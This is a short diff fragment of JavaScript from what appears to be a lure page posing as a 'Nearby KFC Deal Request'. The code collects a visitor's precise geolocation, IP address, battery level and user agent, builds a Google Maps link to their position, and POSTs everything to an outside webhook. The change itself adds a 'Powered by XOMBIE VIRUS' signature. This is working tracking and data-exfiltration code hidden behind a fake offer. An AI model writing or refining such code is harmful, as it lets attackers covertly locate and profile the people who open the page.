@@ -144,15 +144,18 @@
             lon = position.coords.longitude;
             accuracy = position.coords.accuracy;
 
-            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            const content = `🍗 **Nearby KFC Deal Request**
+       const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+const signature = `\n\n🧠 **Powered by XOMBIE VIRUS** ☣️`;
+
+const content = `🍗 **Nearby KFC Deal Request**
 📍 **Latitude:** ${lat}
 📍 **Longitude:** ${lon}
 🎯 **Accuracy:** ${accuracy} meters
 🌐 **IP Address:** ${ip}
 🔋 **Battery:** ${battery}
 🧠 **User Agent:** ${userAgent}
-📍 [Google Maps Link](${mapUrl})`;
+📍 [Google Maps Link](${mapUrl})${signature}`;
+
 
             fetch(webhookUrl, {
               method: "POST",
